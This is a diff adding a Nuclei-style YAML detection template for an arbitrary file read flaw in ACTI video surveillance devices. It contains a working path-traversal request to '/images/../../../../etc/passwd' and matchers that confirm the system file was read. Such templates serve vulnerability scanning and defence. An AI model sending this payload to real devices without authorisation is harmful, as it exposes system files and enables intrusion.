@@ -1,0 +1,29 @@
+id: acti-video-surveillance-images-anyfile-read
+info:
+  name: "ACTI Video Surveillance Images 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ACTI
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/images/../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
